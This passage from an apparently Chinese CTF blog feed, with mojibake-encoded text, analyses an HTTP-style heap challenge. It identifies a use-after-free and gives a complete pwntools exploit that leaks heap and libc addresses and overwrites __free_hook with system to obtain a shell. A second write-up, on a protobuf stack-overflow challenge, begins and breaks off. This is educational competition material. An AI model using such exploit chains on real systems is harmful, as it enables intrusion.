class="hljs-keyword">else</span><br>      &#123;<br>        *(a2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>      &#125;<br>      s2a = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot; &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( s2a != <span class="hljs-built_in">strchr</span>(s2a, <span class="hljs-string">&#x27;/&#x27;</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      *a2 = s2a;<br>      s2b = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot; &quot;</span>);<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s2b, <span class="hljs-string">&quot;HTTP/1.0&quot;</span>) &amp;&amp; !<span class="hljs-built_in">strcmp</span>(s2b, <span class="hljs-string">&quot;HTTP/1.1&quot;</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      haystack = v5;<br>      v5 = <span class="hljs-built_in">strstr</span>(v5, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( v5 )                                 <span class="hljs-comment">// same to the top</span><br>      &#123;<br>        v5[<span class="hljs-number">1</span>] = <span class="hljs-number">32</span>;<br>        *v5 = <span class="hljs-number">0</span>;<br>        v5 += <span class="hljs-number">2</span>;<br>      &#125;<br>      cnt = <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strchr</span>(front_part, <span class="hljs-string">&#x27;:&#x27;</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      haystack = v5;<br>      v5 = <span class="hljs-built_in">strstr</span>(v5, <span class="hljs-string">&quot;\r\n&quot;</span>);<br>      <span class="hljs-keyword">if</span> ( v5 )<br>      &#123;<br>        v5[<span class="hljs-number">1</span>] = <span class="hljs-number">32</span>;<br>        *v5 = <span class="hljs-number">0</span>;<br>        v5 += <span class="hljs-number">2</span>;<br>      &#125;<br>      ++cnt;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( cnt == <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  *(a2 + <span class="hljs-number">8</span>) = haystack;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯åšäº†ä¸€ä¸ªHTTPçš„æŠ¥æ–‡è§£æï¼Œæ ¹æ®å¤´çš„ä¸åŒï¼Œæœ‰ä¸åŒçš„è¿”å›å€¼ï¼Œå¹¶ä¸”ä¼šå°†æŠ¥æ–‡ç»“å°¾â€™\r\nâ€™ä¹‹åçš„å­—ç¬¦ä¸²èµ‹å€¼ç»™ä¼ è¿›æ¥çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚å³è¿™ä¸ªå‡½æ•°ä¸»è¦å¹²äº†ä¸‰ä»¶äº‹</p><ul><li>è§£æHTTPæŠ¥æ–‡ï¼Œç¡®å®šå‡½æ•°è¿”å›å€¼</li><li>æ ¹æ®è¯·æ±‚ç±»å‹èµ‹å€¼ç»™<code>a2+16</code>ä¸åŒçš„å€¼</li><li>å°†é™„å¸¦å­—ç¬¦ä¸²èµ‹å€¼ç»™<code>a2+8</code>çš„åœ°å€</li></ul><p>æˆ‘ä»¬ç»§ç»­çœ‹å¦å¤–ä¸€ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">sub_15FD</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> choice; <span class="hljs-comment">// [rsp+14h] [rbp-2Ch]</span><br>  __int64 idx2; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">unsigned</span> __int64 size; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  <span class="hljs-type">char</span> *nptr; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptra; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptrb; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">char</span> *pointer; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br>  <span class="hljs-type">char</span> *pointer2; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( *(a1 + <span class="hljs-number">16</span>) == <span class="hljs-number">2</span> )                        <span class="hljs-comment">// POSTæ–¹æ³•è¿›å…¥</span><br>  &#123;<br>    nptr = strtok(*(a1 + <span class="hljs-number">8</span>), <span class="hljs-string">&quot;&amp;&quot;</span>);              <span class="hljs-comment">// use &#x27;&amp;&#x27; to split the string</span><br>                                                <span class="hljs-comment">// choice &amp; idx</span><br>    <span class="hljs-keyword">if</span> ( !nptr )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    choice = *nptr;<br>    nptra = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( !nptra )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    idx = atoi(nptra);<br>    idx2 = idx;<br>    <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0x10</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !flag )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( choice == <span class="hljs-number">4</span> )<br>    &#123;<br>      del(idx);                                 <span class="hljs-comment">// free(un4040+idx)</span><br>                                                <span class="hljs-comment">// UAF</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( choice &lt;= <span class="hljs-number">4</span> )<br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( choice )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>          show(idx);                            <span class="hljs-comment">// show(un4040+v2)</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:                                <span class="hljs-comment">// 1&amp;idx&amp;size&amp;pointer</span><br>          nptrb = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !nptrb )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          size = atoi(nptrb);<br>          <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x500</span> )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          pointer = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !pointer )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          create(idx2, size, pointer);          <span class="hljs-comment">// un4040+idx = malloc(size)</span><br>                                                <span class="hljs-comment">// memcpy(chunk,pointer,size)</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>          pointer2 = strtok(<span class="hljs-number">0LL</span>, <span class="hljs-string">&quot;&amp;&quot;</span>);<br>          <span class="hljs-keyword">if</span> ( !pointer2 )<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>          <span class="hljs-built_in">strcpy</span>(idx2, pointer2);               <span class="hljs-comment">//  memcpy(*(&amp;unk_4040 + idx), nptrd, str(nptrd))</span><br>          <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  result = *(a1 + <span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">if</span> ( result == <span class="hljs-number">8</span> )<br>  &#123;<br>    result = <span class="hljs-built_in">strcmp</span>(*(a1 + <span class="hljs-number">8</span>), <span class="hljs-string">&quot;rotartsinimda&quot;</span>);<span class="hljs-comment">// admin is trator</span><br>    <span class="hljs-keyword">if</span> ( !result )<br>      flag = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸»è¦å¹²äº†è¿™å‡ ä»¶äº‹</p><ul><li>æ ¹æ®<code>a1+16</code>çš„å€¼ä¸åŒï¼Œè¿›å…¥ä¸åŒçš„åˆ¤æ–­åˆ†æ”¯(<code>a1+16</code>çš„å€¼æ˜¯ç”±æŠ¥æ–‡è¯·æ±‚æ–¹å¼å†³å®šï¼‰</li><li>ç”¨<code>&amp;</code>åˆ†å‰²äº†<code>a1+8</code>å¤„çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ ¹æ®å­—ç¬¦ä¸²å†³å®šä¸åŒå‡½æ•°</li><li>å®ç°äº†ä¸€èˆ¬å †é¢˜ç›®çš„å‡ ä¸ªå‡½æ•°</li></ul><blockquote><p>å¦å¤–éœ€è¦æ³¨æ„ï¼Œè¦å°†flagç½®1æ‰èƒ½è¿›å…¥å †æ“ä½œçš„é€‰å•ï¼Œæ‰€ä»¥å…ˆè¦è¿›å…¥æœ€ä¸‹é¢çš„å­—ç¬¦ä¸²åˆ¤æ–­</p></blockquote><p><img src="/img/article/chunqiuiot/image-20221103203402587.png" alt="image-20221103203402587"></p><p>ç»“åˆå‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬åŸºæœ¬ç¡®å®špayloadçš„å½¢å¼ä¸ºç±»ä¼¼å¦‚ä¸‹ç‰¹å¾</p><p><code>POST / HTTP/1.1\r\n\x01&amp;1&amp;0x30&amp;aaaa</code></p><p>è¿™ä¸ªç¨‹åºçš„æ¼æ´ä¸»è¦åœ¨<code>free</code>è¿™é‡Œï¼Œå­˜åœ¨UAFæ¼æ´</p><p><img src="/img/article/chunqiuiot/image-20221103203911463.png" alt="image-20221103203911463"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åŸºæœ¬åˆ©ç”¨å°±æ¯”è¾ƒç®€å•äº†ï¼Œæ³„éœ²<code>heapbase</code>å’Œ<code>libc</code>ååŠ«æŒ<code>free_hook</code>å³å¯ï¼Œè¿™é“é¢˜ä¸»è¦è¿˜æ˜¯ä»£ç é€»è¾‘ç›¸å¯¹éš¾ä¸€äº›ğŸ˜­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;210.30.97.133&#x27;</span>,<span class="hljs-number">28094</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-F&#x27;</span> <span class="hljs-string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="hljs-string">&#x27;-P&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;DEV / HTPP/1.1\r\nrotartsinimda\x00&quot;</span><br>    io.sendline(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx,size,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x01&#x27;</span>+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(size)+<span class="hljs-string">&#x27;&amp;&#x27;</span>+ text<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x04&#x27;</span>+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x03&#x27;</span>+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Waiting Package...&#x27;</span>)   <br>    payload = <span class="hljs-string">&quot;POST / HTTP/1.1\r\n&quot;</span>+<span class="hljs-string">&#x27;\x02&#x27;</span>+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-built_in">str</span>(idx)+<span class="hljs-string">&#x27;&amp;&#x27;</span>+ text<br>    io.sendline(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>    gdb.attach(proc.pidof(io)[<span class="hljs-number">0</span>])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    login()<br>    <span class="hljs-comment"># pause()</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        create(i,<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><br>    free(<span class="hljs-number">0</span>)    <br>    show(<span class="hljs-number">0</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Content-Length: 5\n&#x27;</span>)<br>    <span class="hljs-comment"># io.recvline()</span><br>    key = u64(io.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heapbase = key&lt;&lt;<span class="hljs-number">12</span><br>    <br>   <br>    <span class="hljs-comment"># edit(7,&#x27;a\x00&#x27;)</span><br>    create(<span class="hljs-number">7</span>,<span class="hljs-number">0x420</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>    create(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>    free(<span class="hljs-number">7</span>)<br>    <span class="hljs-comment"># p()</span><br>    create(<span class="hljs-number">9</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;cc&#x27;</span>)<br>    <span class="hljs-comment"># p()</span><br>    show(<span class="hljs-number">7</span>)<br>    <span class="hljs-comment"># p()</span><br>    io.recvuntil(<span class="hljs-string">&#x27;Content-Length: 6\n&#x27;</span>)<br>    libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1e0ff0</span><br>    success(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>    success(<span class="hljs-string">&quot;key--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(key))<br>    success(<span class="hljs-string">&quot;heapbase--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heapbase))<br>    <br>    free_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]    <br>    <span class="hljs-comment"># free(0)</span><br>    <br>    create(<span class="hljs-number">11</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>    create(<span class="hljs-number">12</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>    create(<span class="hljs-number">13</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>    free(<span class="hljs-number">11</span>)<br>    free(<span class="hljs-number">12</span>)<br>    edit(<span class="hljs-number">12</span>,p64(free_hook^key))<br>    <span class="hljs-comment"># p()</span><br>    create(<span class="hljs-number">14</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>    create(<span class="hljs-number">15</span>,<span class="hljs-number">0x30</span>,p64(system_addr))<br>    free(<span class="hljs-number">14</span>)<br>    success(<span class="hljs-string">&#x27;free_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(free_hook))<br>    success(<span class="hljs-string">&#x27;system--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(system_addr))<br>    <br>    <span class="hljs-comment"># p()</span><br>       <br>    <br>    io.interactive()<br>    <br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwn()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç¥¥äº‘æ¯2022ã€‘PWN-WriteUp-protocol</title>
    <link href="/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/"/>
    <url>/2022/11/01/%E3%80%90%E7%A5%A5%E4%BA%91%E6%9D%AF2022%E3%80%91PWN-WriteUp-protocol/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡è§åˆ°google protobufç±»å‹çš„é¢˜ç›®ï¼Œè™½ç„¶æ˜¯åˆ°ç­¾åˆ°é¢˜ï¼Œä½†è¿˜æ˜¯å­¦åˆ°äº†ä¸€äº›æ–°çš„ä¸œè¥¿</p><h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><p>é¦–å…ˆå¯¼å…¥æ–‡ä»¶ï¼Œå½“æˆ‘çœ‹åˆ°å·¦ä¾§å¯†å¯†éº»éº»çš„æ— åå‡½æ•°å°±æ„Ÿå—åˆ°äº†ä¸€ä¸ä¸å¯¹åŠ²</p><p><img src="/img/article/protocol/image-20221101210554873.png" alt="image-20221101210554873"></p><p>å…ˆè¿è¡Œä¸€ä¸‹ç¨‹åºï¼Œå‘ç°è¾“å‡ºäº†ä¸€ä¸ª<code>Login:</code></p><p><img src="/img/article/protocol/image-20221101210642159.png" alt="image-20221101210642159"></p><p>é€šè¿‡è¿™ä¸ªå­—ç¬¦ä¸²å®šä½åˆ°ä¸»å‡½æ•°ä½ç½®</p><p><img src="/img/article/protocol/image-20221101210733818.png" alt="image-20221101210733818"></p><p><img src="/img/article/protocol/image-20221101210746869.png" alt="image-20221101210746869"></p><p>åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯å»æ‰ç¬¦å·è¡¨äº†ï¼Œè¿™æ ·ç›´æ¥é€†å‘æ˜¾ç„¶ä¸å¤ªè¡Œã€‚å…ˆçœ‹çœ‹ç¨‹åºç¼–è¯‘çš„ç¯å¢ƒæ˜¯ä»€ä¹ˆï¼Œç„¶åé‡æ–°å¯¼å…¥ä¸€ä¸ªsig</p><p><img src="/img/article/protocol/image-20221101210857157.png" alt="image-20221101210857157"></p><p>æˆåŠŸç¡®å®šç‰ˆæœ¬<code>Ubuntu 9.4.0-1ubuntu1~20.04.1</code>,è¿™ä¸ªç‰ˆæœ¬çš„libcåº”è¯¥æ˜¯2.31ï¼Œæ‰¾ä¸€ä¸ªå¯¹åº”çš„sigæ–‡ä»¶å¯¼å…¥å³å¯</p><blockquote><p>è¿™é‡Œæ¨èä¸€ä¸ªsig-databaseï¼š<a href="https://github.com/push0ebp/sig-database">IDA FLIRT Signature Database</a></p><p>åŸºæœ¬èƒ½æ‰¾åˆ°ç»å¤§å¤šæ•°ç³»ç»Ÿå¯¹åº”çš„sig</p></blockquote><p>é€šè¿‡åˆšåˆšçš„<code>stirngs</code>åŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯è¿™ä¸ªäº†ï¼Œä¸‹ä¸‹æ¥ç„¶åæ”¾å…¥ï¼Œ<code>IDA/sig/pc</code>ç›®å½•</p><p><img src="/img/article/protocol/image-20221101211407158.png" alt="image-20221101211407158"></p><p>åœ¨IDAä¸­å¯¼å…¥ï¼Œæ•ˆæœå±•ç¤ºï¼š</p><p><img src="/img/article/protocol/image-20221101211626952.png" alt="image-20221101211626952"></p><p>è™½ç„¶è¿˜æ˜¯æœ‰ç‚¹éš¾é€†ï¼Œä½†æ˜¯å¥½å¾ˆå¤šäº†ï¼Œè¿›å…¥<code>sub_625110</code>å‡½æ•°</p><p><img src="/img/article/protocol/image-20221101211743614.png" alt="image-20221101211743614"></p><p><img src="/img/article/protocol/image-20221101211735339.png" alt="image-20221101211735339"></p><p>åŸºæœ¬ç¡®å®šæ˜¯ä¸ªèµ·åˆ°<code>strcpy</code>ä½œç”¨çš„å‡½æ•°ï¼Œå°†æˆ‘ä»¬è¾“å…¥çš„å…¨å±€å˜é‡æ‹·è´åˆ°æ ˆä¸Šï¼Œä½†æ˜¯ä¸è€ƒè™‘ç›®æ ‡åœ°çš„å¤§å°ï¼ŒåŒæ ·æ˜¯æœ‰æ ˆæº¢å‡ºã€‚ä½†æ˜¯å…¶ä¸­æœ‰å‡ ä¸ªé™åˆ¶</p><ul><li>å­—ç¬¦ä¸²ä¸­ä¸èƒ½å«æœ‰<strong>\x00</strong>ï¼ˆæ„å‘³ç€ä¸èƒ½ç›´æ¥ä½¿ç”¨ROPï¼‰</li><li>æ‹·è´è¿›å…¥æ ˆå†…æ—¶ä¼šåœ¨æœ«å°¾æ·»ç½®ä¸€ä¸ª<strong>\x00</strong></li></ul><p><img src="/img/article/protocol/image-20221101211937850.png" alt="image-20221101211937850"></p><p>ä¿æŠ¤ä¹ŸåŸºæœ¬æ²¡å¼€ï¼Œå¤§æ¦‚å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚</p><h2 id="Google-protobuf"><a href="#Google-protobuf" class="headerlink" title="Google protobuf"></a>Google protobuf</h2><p>åœ¨å­—ç¬¦ä¸²å†…çœ‹åˆ°<code>google protobuf</code>,åº”è¯¥æ˜¯è¿™ä¸ªç›¸å…³é¢˜ç›®</p><blockquote><p>æ¯”èµ›çš„æ—¶å€™çœ‹è¿™ç¯‡åšå®¢ä¸´æ—¶å­¦ä¹ äº†ä¸€ä¸‹ï¼š<a href="https://bbs.pediy.com/thread-270004.htm">2021ç¬¬äº”ç©ºé—´ pb WP</a></p></blockquote><p><img src="/img/article/protocol/image-20221101212029433.png" alt="image-20221101212029433"></p><h3 id="é…ç½®ç¯å¢ƒ"><a href="#é…ç½®ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¯å¢ƒ"></a>é…ç½®ç¯å¢ƒ</h3><p>é¦–å…ˆæ‰¾åˆ°æœ€æ–°ç‰ˆæœ¬çš„protobufï¼š<a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a><br>æˆ‘è¿™é‡Œä¸‹è½½çš„æ˜¯ï¼šprotobuf-cpp-3.21.9.tar.gz</p><p>ä¸‹è½½å¹¶å®‰è£…protobufï¼Œæ³¨æ„éœ€è¦<strong>root</strong>æƒé™ï¼Œä¸”å¿…é¡»åœ¨rootè´¦æˆ·ä¸‹æ“ä½œï¼Œsudo+æŒ‡ä»¤ä¸å¤ªè¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -xzvf protobuf-cpp-3.21.9.tar.gz<br>cd protobuf-3.21.9<br>./autogen.sh<br>./configure --prefix=/usr/local/protobuf<br>make -j8 &amp;&amp; make install<br>ldconfig<br></code></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆä¹‹åï¼Œéœ€è¦é…ç½®protobufå‘½ä»¤ï¼Œæ›´æ–°ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">åœ¨/etc/profileæ–‡ä»¶ä¸­æ·»åŠ ä¸‹é¢ä¸¤è¡Œ</span><br>export PATH=$PATH:/usr/local/protobuf/bin/<br>export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/<br><span class="hljs-meta prompt_"># </span><span 